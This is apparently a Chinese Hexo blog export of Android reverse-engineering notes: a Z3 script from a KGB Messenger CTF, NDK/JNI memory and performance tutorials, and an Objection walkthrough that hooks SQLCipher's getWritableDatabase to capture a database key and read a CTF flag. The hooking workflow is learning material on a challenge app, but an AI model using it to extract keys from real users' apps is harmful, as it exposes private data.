<p>android_studio编写部分的<a href="https://github.com/xiaoeeyu/KGB_Messenger_Decoder/tree/master">代码</a></p>
<hr>
<h3 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h3><p>本来<code>b()</code>是打算用<strong>Z3</strong>解的，但是打印字符串结果的时候一致提示溢出，只好自己手动解了。这里记录一下流程和思路</p>
<blockquote>
<p>因为<code>r</code>字符串有很多不可见字符串，先把它变为可见字符串</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231126173232715.png" class="" title="image-20231126173232715">

<p>同样的，构建 &gt; d8编译为dex &gt; push到手机 &gt; 执行脚本</p>
<p>脚本也添加一个<code>console.log</code></p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231125231137756.png" class="" title="image-20231125231137756">

<p>然后，对与它的算法这里我们暂时先不分析，用<a href="https://github.com/Z3Prover/z3"><strong>Z3</strong></a>试试能不能直接解开</p>
<ul>
<li>Z3是一个基于符号执行的函数求解的工具</li>
</ul>
<pre><code class="js">from z3 import *
from binascii import b2a_hex, a2b_hex

# 创建一个Z3 solver对象
s = Solver()

# 待解密的十六进制字符串
r = "0064736c707d6f510020646b73247c4d0068202b4159516700502a214d24675100"

# 将十六进制字符串转换为字节数组
r_result = bytearray(a2b_hex(r))
print(r_result)

# 逆序交换字节数组中的每个字节
for i in range(int(len(r_result)/2)):
    c = r_result[i]
    r_result[i] = r_result[len(r_result)-i-1]
    r_result[len(r_result)-i-1] = c
print(b2a_hex(r_result))

# 创建Z3的BitVec变量列表，每个变量代表一个字节
x = [BitVec("x%s" % i, 32) for i in range(len(r_result))]

# 添加Z3 solver的约束条件
for i in range(len(r_result)):
    c = r_result[i]
    # 将解密过程表示为Z3约束
    s.add(((x[i] &gt;&gt; (i % 8)) ^ x[i]) == r_result[i])

# 检查是否存在解
if s.check() == sat:
    # 获取解
    model = s.model()
    print(model)

    # 解密后的整数值列表
    decoded_values = []
    for i in range(len(r_result)):
        if model[x[i]] is not None:
            decoded_values.append(model[x[i]].as_long().real)
        else:
            decoded_values.append(0)
    print("Decrypted as integers:", decoded_values)

    # 解密后的十六进制表示列表
    print("Decrypted as hex:", [hex(val) for val in decoded_values])

# 注释掉的部分是将解密后的整数值转换为字符串的代码
# if (s.check() == sat):
#     model = s.model()
#     print(model)
#     flag = ""
#     for i in range(len(r_result)):
#         if (model[x[i]] != None):
#             flag += chr(model[x[i]].as_long().real)
#         else:
#             flag += " "
#     print('"' + flag + '"')
#     print(len(flag), len(r_result))
</code></pre>
<ul>
<li><p>整数和16进制形式打印</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231126173636593.png" class="" title="image-20231126173636593">
</li>
<li><p>字符串形式打印出错</p>
<img src="/2023/11/26/KGBMessager%E8%A7%A3%E5%AF%86/image-20231126173722880.png" class="" title="image-20231126173722880"></li>
</ul>
</blockquote>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/siritobla/article/details/123956940">KGB Messenger解题流程</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>Frida HOOK</tag>
        <tag>算法分析</tag>
      </tags>
  </entry>
  <entry>
    <title>NDK内存管理-引用</title>
    <url>/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/</url>
    <content><![CDATA[<p>NDK中的内存管理：C/C++的new/malloc和delete/free以及JNI引用。</p>
<span id="more"></span>

<h3 id="Java和C-x2F-C-内存管理的区别"><a href="#Java和C-x2F-C-内存管理的区别" class="headerlink" title="Java和C/C++内存管理的区别"></a>Java和C/C++内存管理的区别</h3><img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231018000134675.png" class="" title="image-20231018000134675">

<h3 id="三种引用的区别"><a href="#三种引用的区别" class="headerlink" title="三种引用的区别"></a>三种引用的区别</h3><p>在JNI规范中定义了三种引用：</p>
<ul>
<li>局部引用（LocalReference）</li>
<li>全局引用（Global Reference）</li>
<li>若全局引用（Weak Global Reference）</li>
</ul>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017155656045.png" class="" title="image-20231017155656045">

<blockquote>
<p>因生命周期限制，不能在外部定义一个全局变量接受局部引用，在其他函数使用</p>
</blockquote>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017160104076.png" class="" title="image-20231017160104076">

<blockquote>
<p>之前多线程的代码中使用过，例如：</p>
<pre><code class="C++">jobject appClassloader = env-&gt;NewGlobalRef(TestJclass);
// 使用方式：用参数传递，或者定义一个全局变量接收也行
    pthread_create(&amp;thread, nullptr, threadtest, appClassloader);

env-&gt;DeleteGlobalRef(appClassloader);
</code></pre>
</blockquote>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017161235437.png" class="" title="image-20231017161235437">

<blockquote>
<p>作用域和全局引用是相同的，但是如果内存紧张可能会被ART给释放掉</p>
</blockquote>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017161735432.png" class="" title="image-20231017161735432">

<blockquote>
<p>再JNI种局部引用的创建也是受局部引用表限制的</p>
<pre><code class="C++">for (int i = 0; i &lt; 2048; ++i) {
    jstring content = env-&gt;NewStringUTF("test localreference");
    __android_log_print(4, "xiaoeryu-&gt;jni", "localreference number-&gt;%d", i);
}
</code></pre>
<p>例如这样只创建不删除，有些引用会被自动释放掉</p>
<p>需要在每次循环结束加上<code>env-&gt;DeleteLocalRef(content);</code></p>
<p>测试了之后发现加上比之前好点但是也不稳定，有些变量还是会被自动释放掉，所以还是尽量不要这样使用。</p>
</blockquote>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017163638630.png" class="" title="image-20231017163638630">

<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017163708832.png" class="" title="image-20231017163708832">

<p><strong>EnsureLocalCapacity</strong></p>
<ul>
<li>创建多引用之前可以用EnsureLocalCapacity()测试一下能否创建成功</li>
</ul>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231017163808889.png" class="" title="image-20231017163808889">

<blockquote>
<pre><code class="C++">int len = 10;
if (env-&gt;EnsureLocalCapacity(len) == 0){
    for (int i = 0; i &lt; len; ++i) {
        jstring content = env-&gt;NewStringUTF("test EnsureLocalCapacity");
        __android_log_print(4, "xiaoeryu-&gt;jni", "EnsureLocalCapacity number-&gt;%d", i);
    }
}
</code></pre>
</blockquote>
<p><strong>PushLocalFrame/PopLocalFrame</strong></p>
<ul>
<li>局部引用堆栈的创建和销毁</li>
</ul>
<img src="/2023/10/17/NDK%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%BC%95%E7%94%A8/image-20231018000431116.png" class="" title="image-20231018000431116">

<blockquote>
<pre><code class="C++">jobject testPushAndPopLocalFrame(JNIEnv* env){
    jobject result = nullptr;
    if (env-&gt;PushLocalFrame(20) == 0){
        for (int i = 0; i &lt; 18; ++i) {
            jstring tmp = env-&gt;NewStringUTF("xiaoeryu");
        }
        jstring tmp_1 = env-&gt;NewStringUTF("result_1");
        jstring tmp_2 = env-&gt;NewStringUTF("result_2");
        result = env-&gt;PopLocalFrame(tmp_1);     // 保留tmp_1
    }
    return result;
}
</code></pre>
</blockquote>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>JNI内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>NDK开发性能提升</title>
    <url>/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<p>初步了解以下NDK开发对性能的提升，包括dex2oat的处理、函数运行在解释模式、ART模式、JNI模式的性能差别，以及数据类型的转换。</p>
<span id="more"></span>

<h3 id="NDK开发的优缺点"><a href="#NDK开发的优缺点" class="headerlink" title="NDK开发的优缺点"></a>NDK开发的优缺点</h3><img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231004171212688.png" class="" title="image-20231004171212688">

<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231004171340059.png" class="" title="image-20231004171340059">

<h3 id="什么是ART模式"><a href="#什么是ART模式" class="headerlink" title="什么是ART模式"></a>什么是ART模式</h3><p>dex2oat虽然提升了性能，但是对手机的存储空间、性能、耗电量提出了更高的要求（因为要把几乎所有的函数都要编译一遍），所以从Android7.0开始换为了ART的运作方式</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231004172120146.png" class="" title="image-20231004172120146">

<p>所以java函数在Android7.0之后可能运行在三种模式下：</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231004172259928.png" class="" title="image-20231004172259928">

<h3 id="OAT文件分析"><a href="#OAT文件分析" class="headerlink" title="OAT文件分析"></a>OAT文件分析</h3><p>Google提供了一个[oatdump](<a href="https://android.googlesource.com/platform/art/+/master/oatdump/oatdump.cc">oatdump/oatdump.cc - platform/art - Git at Google (googlesource.com)</a>)工具来反编译oat文件</p>
<p>新建一个native C++项目来测试对oat文件反编译，分析文件结构</p>
<p>在MainActivity.java中写一个简单函数编译一下，安装到手机上</p>
<p><mark>这里测试项目的SDK最好使用Android5.0以下的不然编译出来的dex太多找起来麻烦</mark></p>
<pre><code class="C++">    public int java_add(int num){
        int k = 0;
        for (int i = 0; i &lt; num; i++) {
            k += i;
        }
        return k;
    }
</code></pre>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005113915350.png" class="" title="image-20231005113915350">

<ul>
<li><p>找到生成的odex以及vdex文件</p>
<blockquote>
<p><code>.vdex</code>：其中包含 APK 的未压缩 DEX 代码，以及一些旨在加快验证速度的元数据。</p>
<p><code>.odex</code>：其中包含 APK 中已经过 AOT 编译的方法代码。</p>
</blockquote>
</li>
<li><p>将这两个文件拷贝到<code>sdcard/</code>目录下，然后pull下来</p>
</li>
</ul>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005114157508.png" class="" title="image-20231005114157508">

<ul>
<li>vdex有自己的文件头，在后面也有原本dex的文件头</li>
</ul>
<p>删除vdex的文件头之后，就可以直接用dex的模板来解析dex 文件</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005115841608.png" class="" title="image-20231005115841608">

<ul>
<li>将删除vdex文件头的文件复制一份为dex文件<code>cp .\base.vdex base.dex</code></li>
</ul>
<p>用GDA可以打开（jadx打开失败）</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005115416830.png" class="" title="image-20231005115416830">

<ul>
<li>解析后可以看到我们之前写的<code>java_add</code></li>
</ul>
<h6 id="接下来再看一下odex"><a href="#接下来再看一下odex" class="headerlink" title="接下来再看一下odex"></a>接下来再看一下odex</h6><p>使用系统自带的oatdump工具反编译一下odex文件，顺便将其pull下来查看一下</p>
<p><code>atdump --oat-file=base.odex &gt;&gt;/sdcard/oatdump01.txt  </code></p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005132947459.png" class="" title="image-20231005132947459">

<ul>
<li>从结果可以看到<code>oatdump</code>成功的将oat文件反编译为了smail指令</li>
<li>汇编代码没有生成是因为Android7.0之后的ART不会直接把所有函数都执行dex2oat，它会在运行一段时间之后才会编译为汇编代码。</li>
</ul>
<p>简单测试一下函数的ART模式下和JNI模式下的运行速度差别有多大</p>
<pre><code class="C++">        int k = 0;
        for (int i = 0; i &lt; num; i++) {
            k += i;
        }
        return k;
</code></pre>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005173911411.png" class="" title="image-20231005173911411">

<ul>
<li>从运行一百万次的结果来看其实差别不是很大，表明java函数在执行了一定次数后迅速的从解释模式切换到了ART模式</li>
</ul>
<h3 id="Java-amp-Native数据类型对比"><a href="#Java-amp-Native数据类型对比" class="headerlink" title="Java&amp;Native数据类型对比"></a>Java&amp;Native数据类型对比</h3><p>Java中有8种基本数据类型：</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231006120055489.png" class="" title="image-20231006120055489">

<p>引用数据类型：</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005181318940.png" class="" title="image-20231005181318940">

<p>数组引用类型：</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231005181226052.png" class="" title="image-20231005181226052">

<h6 id="接下来写一些demo来测试类型处理"><a href="#接下来写一些demo来测试类型处理" class="headerlink" title="接下来写一些demo来测试类型处理"></a>接下来写一些demo来测试类型处理</h6><img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231006003551191.png" class="" title="image-20231006003551191">

<p>String和jstring的交换</p>
<pre><code class="java">        String resultString = testjstringapis("Hello from java");
        Log.i("xiaoeryu", "result: " + resultString);
</code></pre>
<pre><code class="java">extern "C"
JNIEXPORT jstring JNICALL
Java_com_xiaoeryu_performancetest01_MainActivity_testjstringapis(JNIEnv *env, jobject thiz,
                                                                 jstring content) {
    // TODO: implement testjstringapis()
    const char* a = env-&gt;GetStringUTFChars(content, nullptr);
    jint jstring_size = env-&gt;GetStringUTFLength(content);
    if (a != nullptr){
        __android_log_print(ANDROID_LOG_INFO, "testjstring", "char content: %s, size: %d", a, jstring_size);
    }
    jstring result = env-&gt;NewStringUTF("Hello from jni");
    return result;
}
</code></pre>
<p>result</p>
<img src="/2023/10/06/NDK%E5%BC%80%E5%8F%91%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87/image-20231006121234205.png" class="" title="image-20231006121234205">
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>NDK性能</tag>
      </tags>
  </entry>
  <entry>
    <title>NDK开发简介</title>
    <url>/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>记录一些NDK开发的基础问题，这里记录的方向会更偏向于逆向、安全方面的内容。</p>
<span id="more"></span>

<h3 id="什么是NDK"><a href="#什么是NDK" class="headerlink" title="什么是NDK"></a>什么是NDK</h3><p>JNI：Java Native Interface的缩写，JAVA本地接口的意思</p>
<p>NDK：Native Development Kit（本地开发套件）</p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003092634874.png" class="" title="image-20231003092634874">

<ul>
<li>可以帮助开发人员快速开发、调试动态库</li>
</ul>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093000349.png" class="" title="image-20231003093000349">

<h3 id="JNI函数"><a href="#JNI函数" class="headerlink" title="JNI函数"></a>JNI函数</h3><p>JNI是一个规范</p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093054836.png" class="" title="image-20231003093054836">

<ul>
<li>有时候需要编译后保留函数名可以加上<em>extern ”C”</em>，使其按C的方式进行编译</li>
</ul>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093230322.png" class="" title="image-20231003093230322">

<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093236354.png" class="" title="image-20231003093236354">

<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093242378.png" class="" title="image-20231003093242378">

<h3 id="JNI参数"><a href="#JNI参数" class="headerlink" title="JNI参数"></a>JNI参数</h3><p>静态函数和动态函数实现的时候第二个传参是不同的</p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093321674.png" class="" title="image-20231003093321674">

<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093324954.png" class="" title="image-20231003093324954">

<p>静态成员可以直接通过类名的方式访问调用，非静态函数是不行的</p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093348658.png" class="" title="image-20231003093348658">

<ul>
<li>通过对参数的分析，我们可以知道一个JNI函数它的参数一定是不少于两个的，从第三个参数开始才是属于函数自己的参数</li>
</ul>
<h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><p>在调用C文件中的函数的时候要显式的加上<em>extern “C”</em></p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093642632.png" class="" title="image-20231003093642632">

<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093715694.png" class="" title="image-20231003093715694">

<ul>
<li>因为如果不加的话编译器会默认按C++的方式进行编译，在函数名称粉碎之后就链接不到了。</li>
</ul>
<p><strong>变量类型</strong></p>
<p>在前面加上 <strong>j</strong></p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003093856500.png" class="" title="image-20231003093856500">

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>执行成功：测试的时候注意一下系统版本</p>
<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003094120836.png" class="" title="image-20231003094120836">

<img src="/2023/10/03/NDK%E5%BC%80%E5%8F%91%E7%AE%80%E4%BB%8B/image-20231003165811000.png" class="" title="image-20231003165811000">

<ul>
<li>debug调试要注意设备版本跟项目SDK版本保持一致，不然会报错</li>
</ul>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>NDK简介</tag>
      </tags>
  </entry>
  <entry>
    <title>Objection快速逆向、自动分析和主动调用</title>
    <url>/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<p>本章用一个简单的仿微信数据库的案例来过一遍Objection的一些操作，怎么快速分析和主动调用。</p>
<p>设备：nexus5</p>
<p>系统版本：Android 6.0</p>
<span id="more"></span>

<p>分析文件是一个<code>.ab</code>文件，.ab后缀的文件是Android系统备份文件的一个格式</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114214020275.png" class="" title="image-20231114214020275">

<h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><p>GitHub上有<a href="https://github.com/nelenkov/android-backup-extractor">解包工具</a>可以先对其进行解包</p>
<pre><code class="bash">┌──(kali㉿kali)-[~/Documents/lesson3]
└─$ java -jar abe.jar unpack 1.ab 1.tar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100% 
9097216 bytes written to 1.tar.
</code></pre>
<p>解包之后解压tar文件，然后查看内容</p>
<blockquote>
<pre><code class="bash">┌──(kali㉿kali)-[~/Documents/lesson3]
└─$ tar xvf 1.tar 
apps/com.example.yaphetshan.tencentwelcome/a/base.apk
apps/com.example.yaphetshan.tencentwelcome/db/Demo.db
apps/com.example.yaphetshan.tencentwelcome/Encryto.db
apps/com.example.yaphetshan.tencentwelcome/_manifest

┌──(kali㉿kali)-[~/Documents/lesson3/apps/com.example.yaphetshan.tencentwelcome]
└─$ tree         
.
├── a
│&nbsp;&nbsp; └── base.apk
├── db
│&nbsp;&nbsp; └── Demo.db
├── Encryto.db
└── _manifest
</code></pre>
<ul>
<li><p>接下来分析base.apk安装包，将其安装在手机上，这个app用模拟器调试也行，因为它没有native层的代码。</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231113182749749.png" class="" title="image-20231113182749749"></li>
</ul>
</blockquote>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>这里使用jadx打开<code>base.apk</code>先静态看一下</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114214301881.png" class="" title="image-20231114214301881">

<ul>
<li><p>通过查看MainActivity可以知道它主要完成了以下操作：</p>
<ul>
<li><p>设置界面布局</p>
</li>
<li><p>处理按钮点击事件</p>
</li>
<li><p>写入SQLite数据库，并使用sqlcipher对数据进行加密</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>有些时候jadx静态反编译的结果不一定准确，碰到有问题的也可以使用Objection动态确认一下</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114214633813.png" class="" title="image-20231114214633813">
</blockquote>
<p>接下来分析一下怎么拿到密码打开数据库</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114111746124.png" class="" title="image-20231114111746124">

<ul>
<li>这里根据它的加密流程，我们可以考虑通过hook它的加密参数来拿到加密的密码</li>
</ul>
<p>通过之前的静态分析可以知道写入数据库的过程是在<code>a()</code>中实现的，通过在<code>a()</code>方法中调用<code>getWritableDatabase</code>来设置密码</p>
<p>如此我们可以考虑hook<code>getWritableDatabase</code>监听它传入的参数来拿到密码</p>
<h2 id="使用objection分析"><a href="#使用objection分析" class="headerlink" title="使用objection分析"></a>使用objection分析</h2><p>先拿到主包的句柄</p>
<pre><code class="bash">objection -N -h 192.168.1.8 -p 9999 -g com.example.yaphetshan.tencentwelcome explore

android heap search instances com.example.yaphetshan.tencentwelcome.MainAct
ivity		# 获取MainActivity的handle
</code></pre>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114163742107.png" class="" title="image-20231114163742107">

<ul>
<li>知道<code>MainActivity</code>的句柄了之后就可以调用<code>a()</code>了</li>
</ul>
<p>然后来获取一下<code>getWritableDatabase</code>的包名和路径来添加监听</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114165125456.png" class="" title="image-20231114165125456">

<p>执行命令获取包名路径</p>
<p><code>android hooking list class_methods net.sqlcipher.database.SQLiteOpenHelper</code></p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114164820838.png" class="" title="image-20231114164820838">



<p>监听参数获取密码</p>
<pre><code class="bash">android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.
getWritableDatabase --dump-args		# 监听参数

android heap execute 0x10052e a		# 手动调用a()
</code></pre>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114165714364.png" class="" title="image-20231114165714364">



<p>用拿到的密钥去打开Encryto数据库：数据库的位置可以在我们前面解压的目录下看到</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114172649745.png" class="" title="image-20231114172649745">

<p>使用<a href="https://sqlitebrowser.org/">DB Browser for SQLite</a>可以打开sqlcipher加密的数据库文件</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114173205763.png" class="" title="image-20231114173205763">

<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114173414722.png" class="" title="image-20231114173414722">

<p>这个flag值看起来像是base64，拿去解码看看</p>
<img src="/2023/11/14/Objection%E5%BF%AB%E9%80%9F%E9%80%86%E5%90%91%E3%80%81%E8%87%AA%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8/image-20231114173634543.png" class="" title="image-20231114173634543">

<ul>
<li>这就是最终的flag了<code>Tctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</code></li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Objection环境、自动化分析和插件</title>
    <url>/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>在上一章搭建好了frida和objection环境，本章主要学习一下这些工具怎么使用</p>
<span id="more"></span>

<h2 id="frida和objection工具的使用"><a href="#frida和objection工具的使用" class="headerlink" title="frida和objection工具的使用"></a>frida和objection工具的使用</h2><p>关于这两个工具的使用，可以参考<a href="https://www.anquanke.com/post/id/197657">roysue大佬这篇文章</a>中的内存漫游和hook部分。</p>
<p>这里只补充记录一点细节：</p>
<blockquote>
<ol>
<li><p>frida和objection都提供的有help</p>
<pre><code>frida -h	# frida打开help的命令

objection --help	# objection打开help的命令
</code></pre>
</li>
<li><p>检索</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111205623353.png" class="" title="image-20231111205623353">

<ul>
<li><p>也可以使用cat命令检索objectin.log的文件</p>
<pre><code class="bash">──(kali㉿kali)-[~]
└─$ cat .objection/objection.log | grep -i frida
frida
Frida Version         12.8.0
Frida Heap Size       16.9 MiB
frida
Frida Version         12.8.0
Frida Heap Size       16.9 MiB
frida
Frida Version         12.8.0
Frida Heap Size       28.4 MiB
help frida
Command: frida
Usage: frida
Displays information about Frida. This includes the version of the Frida gadget,
   frida
frida-agent-64.so                                                      0x743735e000  20021248 (19.1 MiB)  /data/local/tmp/re.frida.server/frida-agent-64.so
